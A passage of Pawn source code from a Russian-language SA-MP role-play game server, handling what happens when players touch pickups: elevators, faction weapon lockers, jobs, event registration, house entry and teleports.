		PlayerTextDrawColor(playerid,AuctionP[playerid][9], -1936945921);
		PlayerTextDrawSetShadow(playerid,AuctionP[playerid][9], 0);
		PlayerTextDrawSetOutline(playerid,AuctionP[playerid][9], 0);
		PlayerTextDrawBackgroundColor(playerid,AuctionP[playerid][9], 255);
		PlayerTextDrawFont(playerid,AuctionP[playerid][9], 2);
		PlayerTextDrawSetProportional(playerid,AuctionP[playerid][9], 1);
		
		for(new i = 0; i < 10; i++) PlayerTextDrawShow(playerid,AuctionP[playerid][i]);
		for(new i = 0; i < 22; i++) TextDrawShowForPlayer(playerid,Auction[i]);
	//	new Float:xs,Float:ys,Float:zz;
	//	GetPlayerPos(playerid,xs,ys,zz);
		if(!GetPVarInt(playerid,"Spec"))
		{
			SetPVarInt(playerid,"Spec",1);
			SetPVarFloat(playerid,"Specx",2791.2046);
			SetPVarFloat(playerid,"Specy",-2400.1770);
			SetPVarFloat(playerid,"Specz",13.6328);
			SetPVarInt(playerid,"Speci",GetPlayerInterior(playerid));
			SetPVarInt(playerid,"Specv",GetPlayerVirtualWorld(playerid));
		}
		SelectTextDraw(playerid, 0xFFCC00FF);
		TogglePlayerSpectating(playerid,true);
		
		SetTimerEx("PutCamera",200,false,"dffffff",playerid,ContainerPos[0][0],ContainerPos[0][1],ContainerPos[0][2]
		,ContainerPos[0][3],ContainerPos[0][4],ContainerPos[0][5]);
		SetPVarInt(playerid,"Cont",1);
		DeletePVar(playerid,"ContW");
		mysql_tquery(mysql, "SELECT * FROM containers WHERE container = '0' ORDER BY `stavka` DESC LIMIT 5", "CheckContainer", "d", playerid);
		
	}
	if(pickupid == fbiinvite)
	{
		if(PlayerInfo[playerid][pMember] != F_FBI) return 1;
		if(PlayerInfo[playerid][pWork] == 0) return SendClientMessage(playerid,CGREY,"Начните рабочий день на базе организации");
		ShowPlayerDialog(playerid,498,DIALOG_STYLE_LIST,"Внедрение в организацию","1 | Документы\n2 | Маскировака","Далее","Отмена");
	

	}
	if(pickupid == fbicar)
	{
		if(PlayerInfo[playerid][pMember] != F_FBI) return 1;
		if(PlayerInfo[playerid][pWork] == 0) return SendClientMessage(playerid,CGREY,"Начните рабочий день на базе организации");
		query = "";
		new str[100];
		for(new i = 0; i < sizeof(Vehicl); i++)
		{
		    format(str,sizeof(str),"%d | %s\t{f7ae11}[%d$]{ffffff}\n",i+1,VehicleNameS[IDVehicl[i]-400],300);
		    strcat(query,str);
		}
		ShowPlayerDialog(playerid,446,DIALOG_STYLE_TABLIST,"Выберите транспорт",query,"Далее","Отмена");
	}
	if(pickupid == fbilift[0]  || pickupid == fbilift[1] || pickupid == fbilift[2]  || pickupid == fbilift[3] )
	{
		if(PlayerInfo[playerid][pMember] != F_FBI) return 1;
	    if(GetPVarInt(playerid,"FloodLift") > gettime()) return 1;
	    if(pickupid == fbilift[0]) SetPVarInt(playerid,"Etaz",2);
     	else if(pickupid == fbilift[1])  SetPVarInt(playerid,"Etaz",1);
     	else if(pickupid == fbilift[2])  SetPVarInt(playerid,"Etaz",0);
     	else if(pickupid == fbilift[3])  SetPVarInt(playerid,"Etaz",3);
     	ShowPlayerDialog(playerid,452,DIALOG_STYLE_LIST,"Лифт","3 этаж\n2 этаж\n1 этаж\nПарковка","Далее","Отмена");
	}
	if(pickupid == hoslift[0]  || pickupid == hoslift[1] )
	{
	    if(GetPVarInt(playerid,"FloodLift") > gettime()) return 1;
	    if(pickupid == hoslift[0]) SetPVarInt(playerid,"Etaz",1);
     	else if(pickupid == hoslift[1])  SetPVarInt(playerid,"Etaz",2);
     	ShowPlayerDialog(playerid,428,DIALOG_STYLE_LIST,"Лифт","2 этаж\n1 этаж","Далее","Отмена");
	}
	if(pickupid == ashlift[0]  || pickupid == ashlift[1] )
	{
	    if(pickupid == ashlift[0]) SetPVarInt(playerid,"Etaz",1);
     	else if(pickupid == ashlift[1])  SetPVarInt(playerid,"Etaz",2);
     	ShowPlayerDialog(playerid,427,DIALOG_STYLE_LIST,"Лифт","2 этаж\n1 этаж","Далее","Отмена");
	}
	if(pickupid == numberpic[0] || pickupid == numberpic[1])
	{
	    if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return 1;
	    ShowPlayerDialog(playerid,385,DIALOG_STYLE_MSGBOX,"Зарегистрировать транспорт","{ffffff}Вы действительно хотите зарегистрировать свой транспорт?\nЦена: {f7ae11}150$","Далее","Отмена");
	}
	if(pickupid == pdlift[3] || pickupid == pdlift[5])
	{
		if(GetPVarInt(playerid,"FloodLift") > gettime()) return 1;
		if(PlayerInfo[playerid][pMember] != F_LSPD) return 1;
		SetPVarInt(playerid,"Etaz",0);
		ShowPlayerDialog(playerid,368,DIALOG_STYLE_LIST,"Лифт","Крыша\n3 этаж\n2 этаж\n1 этаж\nПарковка","Далее","Отмена");
	}
	if(pickupid == pdlift[4] || pickupid == pdlift[6])
	{
		if(GetPVarInt(playerid,"FloodLift") > gettime()) return 1;
		if(PlayerInfo[playerid][pMember] != F_LVPD) return 1;
		SetPVarInt(playerid,"Etaz",4);
		ShowPlayerDialog(playerid,368,DIALOG_STYLE_LIST,"Лифт","Крыша\n3 этаж\n2 этаж\n1 этаж\nПарковка","Далее","Отмена");
	}
	if(pickupid == hospic && PlayerInfo[playerid][pMember] == F_HOSPITAL_LS)
	{
 		if(PlayerInfo[playerid][pWork] == 0) return SendClientMessage(playerid,CGREY,"Начните рабочий день на базе организации");
		if(GetPVarInt(playerid,"HealP") > 0)
		{
            SendClientMessage(playerid,-1,"Вы положили аптечку на склад");
			HosAp++;
			SetMatsInt("HosAp",HosAp);
			SetTimer("UpdAp",300,false);
			DeletePVar(playerid,"HealP");
			if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
		} 
		else
		{
			if(HosAp < 1) return SendClientMessage(playerid,CGREY,"Недостаточно аптечек на складе");
		    SetPlayerAttachedObject(playerid, 1, 11738, 5, 0.218999, 0.014000, 0.000000, 0.000000, -91.800025, 6.099999, 1.000000, 1.00, 1.000000);
		    SetPVarInt(playerid,"HealP",1);
			SendClientMessage(playerid,-1,"Вы взяли аптечку, чтобы её использовать введите: {f7ae11}/heal");
			SendClientMessage(playerid,-1,"Для того, чтобы положить аптечку в специлизированный транспорт используйте: {f7ae11}/put");
			HosAp--;
			SetMatsInt("HosAp",HosAp);
			SetTimer("UpdAp",300,false);
		}
	}
	
	if(pickupid == picvz && PlayerInfo[playerid][pMember] == F_HOSPITAL_LS)
	{
 		if(PlayerInfo[playerid][pWork] == 0) return SendClientMessage(playerid,CGREY,"Начните рабочий день на базе организации");
	    if(HosAp1 < 1) return SendClientMessage(playerid,CGREY,"Недостаточно аптечек на складе");
		if(GetPVarInt(playerid,"HealP") > 0) return SendClientMessage(playerid,CGREY,"У Вас уже есть аптечка");
	    SetPlayerAttachedObject(playerid, 1, 11738, 5, 0.218999, 0.014000, 0.000000, 0.000000, -91.800025, 6.099999, 1.000000, 1.00, 1.000000);
	    SetPVarInt(playerid,"HealP",1);
		SendClientMessage(playerid,-1,"Вы взяли аптечку, чтобы её использовать введите {f7ae11}/heal");
		SendClientMessage(playerid,-1,"Для того, чтобы положить аптечку в специлизированный транспорт используйте: {f7ae11}/put");
		HosAp1--;
		SetMatsInt("HosAp1",HosAp1);
		SetTimer("UpdAp1",300,false);
	}
	if(pickupid == medicpic1[0] || pickupid == medicpic1[1])
	{
	    if(!GetPVarInt(playerid,"Medic") || GetPVarInt(playerid,"MedicW") != 1) return true;
	    SetPlayerAttachedObject(playerid, 1, 11736, 5, 0.151999, 0.021999, 0.000000, 98.999984, -3.199997, 96.899986, 1.000000, 1.00, 1.000000);
		SetPlayerAttachedObject(playerid, 2, 11748, 6, 0.013000, 0.039999, 0.000000, 74.699974, 1.900002, 88.500000, 1.000000, 1.00, 1.000000);
		SetPVarInt(playerid,"MedicW",2);
		SendClientMessage(playerid,CREWARD,"Подойдите к столу для сбора аптечки.");
	}
	if(pickupid == PovarPic)
	{
	    switch(GetPVarInt(playerid,"Povar"))
	    {
	        case 0: ShowPlayerDialog(playerid,250,DIALOG_STYLE_MSGBOX,"Работа повара","{FFFFFF}Вы хотите начать работу повара?","Да","Нет");
	        case 1: ShowPlayerDialog(playerid,250,DIALOG_STYLE_MSGBOX,"Работа повара","{FFFFFF}Вы хотите закончить работу повара?","Да","Нет");
	    }
	}
	if(pickupid >= picpost[0] && pickupid <= picpost[4])
	{
	    if(PlayerInfo[playerid][pMember] != F_LVPD && PlayerInfo[playerid][pMember] != F_LSPD)  return 1;
		new idpost, text[50];
	    if(pickupid == picpost[0]) idpost = 1, text = "Шоссе Las Venturas - Fort Carson";
		if(pickupid == picpost[1]) idpost = 2, text = "Мост Fort Carson - Bayside";
	 	if(pickupid == picpost[2]) idpost = 3, text = "Дамба";
	 	if(pickupid == picpost[3]) idpost = 4, text = "Мост Los Santos - Las Venturas";
	 	if(pickupid == picpost[4]) idpost = 5, text = "Мост Los Santos - San Fierro";
	    if(GetPVarInt(playerid,"ThisPost"))
	    {
	        static const fmt_string1[] = "[R] %s покинул пост №%d (%s)";
			new str1[sizeof(fmt_string1)+MAX_PLAYER_NAME+MAX_PLAYER_NAME+3+20];
			format(str1, sizeof(str1), fmt_string1,PlayerInfo[playerid][pSendername],GetPVarInt(playerid,"ThisPost"),text);
			SendCopsMessage(str1);
			DeletePVar(playerid,"ThisPost");
		}
		else
		{
			static const fmt_string1[] = "[R] %s заступил на пост №%d (%s)";
			new str1[sizeof(fmt_string1)+MAX_PLAYER_NAME+MAX_PLAYER_NAME+3+20];
			format(str1, sizeof(str1), fmt_string1,PlayerInfo[playerid][pSendername],GetPVarInt(playerid,"ThisPost"),text);
			SendCopsMessage(str1);
			SetPVarInt(playerid,"ThisPost",idpost);
		}
	}
	if(pickupid == BityPic[0])
	{
		if(PlayerInfo[playerid][pMember] != F_AZTECAS)  return 1;
		GivePlayerWeapon(playerid,5,1);
	}
	if(pickupid == BityPic[1])
	{
		if(PlayerInfo[playerid][pMember] != F_GROVE)  return 1;
		GivePlayerWeapon(playerid,5,1);
	}
	if(pickupid == BityPic[2])
	{
		if(PlayerInfo[playerid][pMember] != F_BIKERS)  return 1;
		GivePlayerWeapon(playerid,5,1);
	}
	if(pickupid == regpic1[0])
	{
    	SetPlayerPos(playerid,-2158.3369,641.2068,1052.3750);
	    SetPlayerFacingAngle(playerid,179.4713);
	    SetPlayerInterior(playerid,1);
	    SetPlayerVirtualWorld(playerid,2);
	}
	if(pickupid == regpic1[1])
	{
	    if(GetPVarInt(playerid,"DogReg"))
	    {
	        SendClientMessage(playerid,CYELLOW,"Вы были удалены с регистрации");
	        DeletePVar(playerid,"DogReg");
	    }
    	SetPlayerPos(playerid,2184.1785,1114.7395,12.6484);
	    SetPlayerFacingAngle(playerid,58.7433);
	    SetPlayerInterior(playerid,0);
	    SetPlayerVirtualWorld(playerid,0);
	}
	if(pickupid == regpic1[2])
	{
	    if(!DogGame)
	    {
			if(GetPVarInt(playerid,"DogReg") > 0) return SendClientMessage(playerid,CGREY,"Вы уже зарегистрированы");
			new text[30];
			switch(DogMap)
			{
			    case 0: text = "Клуб 'Jizzy'";
			    case 1: text = "RC Battlefield";
			    case 2: text = "San Fierro Police Department";
			    case 3: text = "Особняк Мэд Догга";
			}
			static const fmt_string[] = "{FFFFFF}Вы действительно хотите зарегистрироваться на 'Догонялки'?\nВаша цель: не остаться ведущим в конце игры.\nЦена участия: 25$\nКарта: %s";
			new str[sizeof(fmt_string)+30];
			format(str, sizeof(str), fmt_string,text);
			ShowPlayerDialog(playerid,326,DIALOG_STYLE_MSGBOX,"Регистрация",str,"Далее","Назад");
		}
		else SendClientMessage(playerid,CGREY,"Догонялки уже идут");

	}
	if(pickupid == regpic[0])
	{
    	SetPlayerPos(playerid,-2158.3369,641.2068,1052.3750);
	    SetPlayerFacingAngle(playerid,179.4713);
	    SetPlayerInterior(playerid,1);
	    SetPlayerVirtualWorld(playerid,1);
	}
	if(pickupid == regpic[1])
	{
	    if(GetPVarInt(playerid,"DriftReg"))
	    {
	        SendClientMessage(playerid,CYELLOW,"Вы были удалены с регистрации");
	        DeletePVar(playerid,"DriftReg");
	    }
	    if(GetPVarInt(playerid,"GGReg"))
	    {
	        SendClientMessage(playerid,CYELLOW,"Вы были удалены с регистрации");
	        DeletePVar(playerid,"GGReg");
	    }
    	SetPlayerPos(playerid,1633.4722,971.8034,10.8203);
	    SetPlayerFacingAngle(playerid,265.9857);
	    SetPlayerInterior(playerid,0);
	    SetPlayerVirtualWorld(playerid,0);
	}
	if(pickupid == regpic[2])
	{
	    if(StartReg > 0)
	    {
			if(GetPVarInt(playerid,"DriftReg") > 0) return SendClientMessage(playerid,CGREY,"Вы уже зарегистрированы");
			ShowPlayerDialog(playerid,243,DIALOG_STYLE_MSGBOX,"Регистрация","{FFFFFF}Вы действительно хотите зарегистрироваться на 'Kart Racing'?\nВаша цель: приехать на финиш первым.\nЦена участия: 50$","Далее","Назад");
		}
		else if(StartRegGG > 0)
	    {
			if(GetPVarInt(playerid,"GGReg") > 0) return SendClientMessage(playerid,CGREY,"Вы уже зарегистрированы");
			ShowPlayerDialog(playerid,284,DIALOG_STYLE_MSGBOX,"Регистрация","{FFFFFF}Вы действительно хотите зарегистрироваться на 'GunGame'?\nВаша цель: набрать максимальный уровень.\nЦена участия: 50$","Далее","Назад");
		}
		else SendClientMessage(playerid,CGREY,"Регистрация закрыта");
		
	}
	if(pickupid == turpic[0])
	{
		if(IsACop(playerid) || PlayerInfo[playerid][pMember] == F_MAYOR  || PlayerInfo[playerid][pMember] == F_ARMY || PlayerInfo[playerid][pJailTime] > 0)
		{
		    SetPVarInt(playerid,"Progulka",1);
		    SetPlayerPos(playerid,208.7442,1359.6794,10.5859);
		    SetPlayerFacingAngle(playerid,81.7835);
		    SetPlayerInterior(playerid,0);
		    SetPlayerVirtualWorld(playerid,0);
		}
	}
	if(pickupid == turpic[1])
	{
		if(IsACop(playerid) || PlayerInfo[playerid][pMember] == F_MAYOR || PlayerInfo[playerid][pMember] == F_ARMY || PlayerInfo[playerid][pJailTime] > 0)
		{
		    DeletePVar(playerid,"Progulka");
		    SetPVarInt(playerid,"Freeze",1);
		    SetPlayerPos(playerid,-2.1552,-14.2137,1999.5859);
		    SetPlayerFacingAngle(playerid,267.6165);
		    SetPlayerInterior(playerid,1);
		    SetPlayerVirtualWorld(playerid,1);
		}
	}
	if(pickupid == turpic[2])
	{
		if(IsACop(playerid) || PlayerInfo[playerid][pMember] == F_MAYOR || PlayerInfo[playerid][pMember] == F_ARMY)
		{
		    
		    SetPlayerPos(playerid,247.6362,1421.1980,10.5859);
		    SetPlayerFacingAngle(playerid,300.1739);
		    SetPlayerInterior(playerid,0);
		    SetPlayerVirtualWorld(playerid,0);
		}
	}
	if(pickupid == turpic[3])
	{
		if(IsACop(playerid) || PlayerInfo[playerid][pMember] == F_MAYOR || PlayerInfo[playerid][pMember] == F_ARMY)
		{
		    SetPVarInt(playerid,"Freeze",1);
		    SetPlayerPos(playerid,0.0949,-2.5291,1999.5859);
		    SetPlayerFacingAngle(playerid,179.8822);
		    SetPlayerInterior(playerid,1);
		    SetPlayerVirtualWorld(playerid,1);
		}
	}
	for(new i = 1; i <= TOTALHOUSE; i++)
	{
		if(pickupid == HInfo[i][hPick])
		{
		    if(GetPVarInt(playerid,"Vihod") > 0) return DeletePVar(playerid,"Vihod");
		    new str[200];
		    if(!strcmp(HInfo[i][hOwner],"None",true)) format(str,sizeof(str),"{FFFFFF}Номер:\t\t\t{f7ae11}%i{FFFFFF}\nЦена:\t\t\t{f7ae11}$%i{FFFFFF}\nОплата в день:\t{f7ae11}$%i{FFFFFF}\nКласс:\t\t\t{f7ae11}%s",i,HInfo[i][hCost],HInfo[i][hTax],HInfo[i][hClass]);
		    else format(str,sizeof(str),"{FFFFFF}Номер:\t\t\t{f7ae11}%i{FFFFFF}\nВладелец:\t\t{f7ae11}%s{FFFFFF}\nОплата в день:\t{f7ae11}$%i{FFFFFF}\nКласс:\t\t\t{f7ae11}%s",i,HInfo[i][hOwner],HInfo[i][hTax],HInfo[i][hClass]);
		    ShowPlayerDialog(playerid,111,DIALOG_STYLE_MSGBOX,"Дом",str,"Войти","Отмена");
		    SetPVarInt(playerid,"PHOUSE",i);
		    break;
		}
	/*	if(!HInfo[i][hGarPic]) continue;
		if(pickupid == HInfo[i][hGarPic])
		{
		    if(GetPVarInt(playerid,"PHOUSE") == GetPVarInt(playerid,"PlayerHouse") || PlayerInfo[playerid][pFam] && FamInfo[PlayerInfo[playerid][pFam]][fHouse] == GetPVarInt(playerid,"PHOUSE") && FamInfo[PlayerInfo[playerid][pFam]][fShkaf])
	    	{
          		SetPlayerPos(playerid,258.7234,-40.7600,1002.0234);
			    SetPlayerCameraPos(playerid,256.015441,-42.447757,1002.323669);
				SetPlayerCameraLookAt(playerid,256.885528,-41.956615,1002.282043);
                DeletePVar(playerid,"ShkafRaz");
        		SetPVarInt(playerid,"Shkaf",1);
        		SetPlayerFacingAngle(playerid,117.4438);
        		SetPlayerInterior(playerid,14);
				TogglePlayerControllable(playerid, 0);
                for(new x = 0; x < 18; x++) TextDrawShowForPlayer(playerid,ObjectBuy[x]);
                for(new x = 0; x < 2; x++) PlayerTextDrawShow(playerid,ObjectBuyP[x][playerid]);
				SelectTextDraw(playerid, CGREY);
        		break;
	    	}
		}*/
		
	}
	for(new i = 1; i <= TOTALENTERS; i++)
	{
		if(pickupid == EntersInfo[i][pP])
		{

		    if(EntersInfo[i][pMem] > 0 && PlayerInfo[playerid][pMember] != EntersInfo[i][pMem] && GetPVarInt(playerid,"Prop") != EntersInfo[i][pMem] && !IsACop(playerid)) return SendClientMessage(playerid,CGREY,"У Вас нет ключей");
			switch(i)
		    {
		        case 1,5:
	            {
	                SendClientMessage(playerid,-1,"Проберитесь в раздевалку! Для взлома двери используйте: {f7ae11}LALT");
	            }
	            case 83:
	            {
					new band = PlayerInfo[playerid][pGrabTeam];
					if(band)
					{
					    if(BankGrab[band][bGrab] && BankGrab[band][bGrabStatus] == 1 && !BankGrab[band][bTown])
					    {
	                		if(!GetPVarInt(playerid,"Mask")) return SendClientMessage(playerid,-1,"Вы должны надеть маску, используйте: {f7ae11}/mask");
	                	}
	                }
	            }
	            case 85:
	            {
					new band = PlayerInfo[playerid][pGrabTeam];
					if(band)
					{
					    if(BankGrab[band][bGrab] && BankGrab[band][bGrabStatus] == 1 && BankGrab[band][bTown])
					    {
	                		if(!GetPVarInt(playerid,"Mask")) return SendClientMessage(playerid,-1,"Вы должны надеть маску, используйте: {f7ae11}/mask");
	                	}
	                }
	            }
		        case 50:
		        {
		            if(GetPVarInt(playerid,"ArmyW") > 0)
					{
						DisablePlayerCheckpoint(playerid);
						if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
						DeletePVar(playerid,"ArmyW");
					}
					SetPlayerRaceCheckpoint(playerid,2,2181.2771,1578.8796,999.9712,0,0,0,1); //mayor
      				SetPVarInt(playerid,"GPS",1);
      				SendClientMessage(playerid,CGREEN,"Возьмите заготовки на складе.");
					
		        }
		        case 9:
		        {
		            if(PlayerInfo[playerid][pNHeal]) return SendClientMessage(playerid,CGREY,"Опасно выходить в город в таком состоянии");
		        }
		        case 57:
		        {
		        	if(!IsAGos(playerid) && !PlayerInfo[playerid][pJailTime]) return SendClientMessage(playerid,CGREY,"У Вас нет ключей");
		        	if(PlayerInfo[playerid][pJailTime]) SetPVarInt(playerid,"Progulka",2);
		        }
		        case 58:
		        {
		            if(PlayerInfo[playerid][pJailTime]) SetPVarInt(playerid,"Progulka",1);
		        }
		    }
		    SetCameraBehindPlayer(playerid);
		    FreezePlayer(playerid,EntersInfo[i][ptX],EntersInfo[i][ptY],0.8);
			SetPVarInt(playerid,"Freeze",1);
			SetPlayerPos(playerid,EntersInfo[i][ptX],EntersInfo[i][ptY],EntersInfo[i][ptZ]);
			SetPlayerFacingAngle(playerid, EntersInfo[i][ptFa]);
			SetPlayerInterior(playerid,EntersInfo[i][ptI]);
			SetPlayerVirtualWorld(playerid,EntersInfo[i][ptV]);
			return true;
		}
	}
	if(pickupid == narkopic[0])
	{
	    if(IsAMafia(playerid) || IsAGang(playerid))
	    {
	        SetPlayerPos(playerid,1047.5310,2916.4805,1051.8601);
	        FreezePlayer(playerid,1047.5310,2916.4805,0.8);
	        SetPlayerFacingAngle(playerid,358.4469);
			SetPlayerVirtualWorld(playerid,1);
			SetPlayerInterior(playerid,1);
	    }
	    else SendClientMessage(playerid,CGREY,"У Вас нет ключей");
	}
	if(pickupid == narkopic[1])
	{
	    if(IsAMafia(playerid) || IsAGang(playerid))
	    {
	        SetPlayerPos(playerid,1048.9219,2906.5366,47.8231);
	        SetPlayerFacingAngle(playerid,178.1099);
			SetPlayerVirtualWorld(playerid,0);
			SetPlayerInterior(playerid,0);
	    }
	    else SendClientMessage(playerid,CGREY,"У Вас нет ключей");
	}
	if(pickupid == zavodpic)
	{
	    if(!GetPVarInt(playerid,"ArmyW") && PlayerInfo[playerid][pMember] == F_ARMY)
	    {
	        SetPlayerAttachedObject(playerid, 1, 2969, 1, 0.049999, 0.369999, -0.010999, 0.000000, 94.699913, 0.000000, 1.000000, 1.00, 1.000000);
			SetPlayerSpecialAction(playerid,25);
			SetPVarInt(playerid,"ArmyW",1);
			SendClientMessage(playerid,CGREEN,"Отнесите заготовки на стол.");
	    }
	}
	if(pickupid == pered)
	{
	    switch(GetPVarInt(playerid,"Gruz"))
	    {
	        case 0: ShowPlayerDialog(playerid,68,DIALOG_STYLE_MSGBOX,"Работа грузчика","{FFFFFF}Вы хотите начать работу грузчика?","Да","Нет");
	        case 1: ShowPlayerDialog(playerid,68,DIALOG_STYLE_MSGBOX,"Работа грузчика","{FFFFFF}Вы хотите закончить работу грузчика?","Да","Нет");
	    }
	}
	if(pickupid == pered)
	{
	    switch(GetPVarInt(playerid,"Gruz"))
	    {
	        case 0: ShowPlayerDialog(playerid,68,DIALOG_STYLE_MSGBOX,"Работа грузчика","{FFFFFF}Вы хотите начать работу грузчика?","Да","Нет");
	        case 1: ShowPlayerDialog(playerid,68,DIALOG_STYLE_MSGBOX,"Работа грузчика","{FFFFFF}Вы хотите закончить работу грузчика?","Да","Нет");
	    }
	}
	if(pickupid == pespic)
	{
	    switch(GetPVarInt(playerid,"Pes"))
	    {
	        case 0: ShowPlayerDialog(playerid,272,DIALOG_STYLE_MSGBOX,"Работа по добыче песка","{FFFFFF}Вы хотите начать работу по добыче песка?","Да","Нет");
	        case 1: ShowPlayerDialog(playerid,272,DIALOG_STYLE_MSGBOX,"Работа по добыче песка","{FFFFFF}Вы хотите закончить работу по добыче песка?","Да","Нет");
	    }
	}
	if(pickupid == shevipic)
	{
		if(!PlayerInfo[playerid][pJail]) return 1;
	    switch(GetPVarInt(playerid,"Shve"))
	    {
	        case 0: ShowPlayerDialog(playerid,329,DIALOG_STYLE_MSGBOX,"Работа швеи","{FFFFFF}Вы хотите начать работу швеи?","Да","Нет");
	        case 1: ShowPlayerDialog(playerid,329,DIALOG_STYLE_MSGBOX,"Работа швеи","{FFFFFF}Вы хотите закончить работу швеи?","Да","Нет");
	    }
	}
	
	if(pickupid == medicpic)
	{
	    switch(GetPVarInt(playerid,"Medic"))
	    {
	        case 0: ShowPlayerDialog(playerid,256,DIALOG_STYLE_MSGBOX,"Работа сборщика аптечек","{FFFFFF}Вы хотите начать работу сборщика аптечек?","Да","Нет");
	        case 1: ShowPlayerDialog(playerid,256,DIALOG_STYLE_MSGBOX,"Работа сборщика аптечек","{FFFFFF}Вы хотите закончить работу сборщика аптечек?","Да","Нет");
	    }
	}
	if(pickupid >= pickmeria[0] && pickupid <= pickmeria[3])
	{
	    if(PlayerInfo[playerid][pMember] != 1) return SendClientMessage(playerid,CGREY,"У Вас нет ключей");
	    if(pickupid == pickmeria[0]) SetPVarInt(playerid,"Lift",2);
	    else if(pickupid == pickmeria[1]) SetPVarInt(playerid,"Lift",4);
	    else if(pickupid == pickmeria[2]) SetPVarInt(playerid,"Lift",1);
        else if(pickupid == pickmeria[3]) SetPVarInt(playerid,"Lift",3);
		ShowPlayerDialog(playerid,287,DIALOG_STYLE_LIST,"Лифт","Крыша\n1 этаж\n2 этаж\nПарковка","Далее","Отмена");
	}
	if(pickupid == gunpic[1])
	{
	    if(PlayerInfo[playerid][pMember] == 1 && PlayerInfo[playerid][pRank] > 0 && PlayerInfo[playerid][pRank] < 3)
		{
		    if(!PlayerInfo[playerid][pLic][L_GUN]) return SendClientMessage(playerid,CGREY,"У Вас нет лицензии на оружие");
			if(GetPVarInt(playerid,"AntiFlood223") > gettime()) return SendClientMessage(playerid,CGREY,"Брать комплект можно раз в 15 минут");
		    if(PlayerInfo[playerid][pWork] == 0) return SendClientMessage(playerid,CGREY,"Начните рабочий день на базе организации");
			SetArmour(playerid,100);
			GivePlayerWeapon(playerid,24,50);
			SendClientMessage(playerid,CBLUE,"Вы взяли комплект охраника");
	  		SetPVarInt(playerid,"AntiFlood223",gettime() + 900);
  		}
  		else SendClientMessage(playerid,CGREY,"Доступно только охраникам");
	}
	if(pickupid == gunpic[6])
	{
	    if(PlayerInfo[playerid][pMember] != F_FBI) return true;
	    if(PlayerInfo[playerid][pWork] == 0) return SendClientMessage(playerid,CGREY,"Начните рабочий день на базе организации");
   		if(GetPVarInt(playerid,"AmmoVR") > 0)
		{
			DeletePVar(playerid,"AmmoVR");
			SetPlayerSpecialAction(playerid,0);
			if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
			ApplyAnimation(playerid, "CARRY", "PUTDWN", 4.1, 0, 0, 0, 0, 0,1);
			static const fmt_string[] = "[R] %s положил 250 материалов на склад. На складе: %i материалов";
			new str[sizeof(fmt_string)+MAX_PLAYER_NAME+5+5+5];
			format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],FracMats[PlayerInfo[playerid][pMember]]);
			SendFMes(PlayerInfo[playerid][pMember],COLOR_SKLAD,str);
			SendClientMessage(playerid,CREWARD,"Вы положили материалы на склад");
			FracMats[PlayerInfo[playerid][pMember]] += 250;
   			SetMatsInt("fbimats",FracMats[PlayerInfo[playerid][pMember]]);
			return true;
		}
  		if(!PlayerInfo[playerid][pLic][L_GUN]) return SendClientMessage(playerid,CGREY,"У Вас нет лицензии на оружие");
	    if(FracLock[PlayerInfo[playerid][pMember]] == 1) return SendClientMessage(playerid,CGREY,"Склад закрыт");
	    ShowPlayerDialog(playerid,63,DIALOG_STYLE_LIST,"Выберете оружие","{FFFFFF}Silenced 9mm\nDesert Eagle\nShotgun\nAK-47\nM4\nMP5\nДубинка\nБронижелет\nПоложить материалы","Далее","Назад");

	}
	if(pickupid == gunpic[5])
	{
	    if(PlayerInfo[playerid][pMember] != F_LSPD) return true;
	    if(PlayerInfo[playerid][pWork] == 0) return SendClientMessage(playerid,CGREY,"Начните рабочий день на базе организации");
   		if(GetPVarInt(playerid,"AmmoVR") > 0)
		{
			DeletePVar(playerid,"AmmoVR");
			SetPlayerSpecialAction(playerid,0);
			if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
			ApplyAnimation(playerid, "CARRY", "PUTDWN", 4.1, 0, 0, 0, 0, 0,1);
			static const fmt_string[] = "[R] %s положил 250 материалов на склад. На складе: %i материалов";
			new str[sizeof(fmt_string)+MAX_PLAYER_NAME+5+5+5];
			format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],FracMats[PlayerInfo[playerid][pMember]]);
			SendFMes(PlayerInfo[playerid][pMember],COLOR_SKLAD,str);
			SendClientMessage(playerid,CREWARD,"Вы положили материалы на склад");
			FracMats[PlayerInfo[playerid][pMember]] += 250;
   			SetMatsInt("lspdmats",FracMats[PlayerInfo[playerid][pMember]]);
			return true;
		}
  		if(!PlayerInfo[playerid][pLic][L_GUN]) return SendClientMessage(playerid,CGREY,"У Вас нет лицензии на оружие");
	    if(FracLock[PlayerInfo[playerid][pMember]] == 1) return SendClientMessage(playerid,CGREY,"Склад закрыт");
	    ShowPlayerDialog(playerid,63,DIALOG_STYLE_LIST,"Выберете оружие","{FFFFFF}Silenced 9mm\nDesert Eagle\nShotgun\nAK-47\nM4\nMP5\nДубинка\nБронижелет\nПоложить материалы","Далее","Назад");

	}
	if(pickupid == gunpic[4])
	{
	    if(PlayerInfo[playerid][pMember] != F_LVPD) return true;
	    if(PlayerInfo[playerid][pWork] == 0) return SendClientMessage(playerid,CGREY,"Начните рабочий день на базе организации");
   		if(GetPVarInt(playerid,"AmmoVR") > 0)
		{
			DeletePVar(playerid,"AmmoVR");
			SetPlayerSpecialAction(playerid,0);
			if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
			ApplyAnimation(playerid, "CARRY", "PUTDWN", 4.1, 0, 0, 0, 0, 0,1);
			static const fmt_string[] = "[R] %s положил 250 материалов на склад. На складе: %i материалов";
			new str[sizeof(fmt_string)+MAX_PLAYER_NAME+5+5+5];
			format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],FracMats[PlayerInfo[playerid][pMember]]);
			SendFMes(PlayerInfo[playerid][pMember],COLOR_SKLAD,str);
			SendClientMessage(playerid,CREWARD,"Вы положили материалы на склад");
			FracMats[PlayerInfo[playerid][pMember]] += 250;
   			SetMatsInt("lvpdmats",FracMats[PlayerInfo[playerid][pMember]]);
			return true;
		}
  		if(!PlayerInfo[playerid][pLic][L_GUN]) return SendClientMessage(playerid,CGREY,"У Вас нет лицензии на оружие");
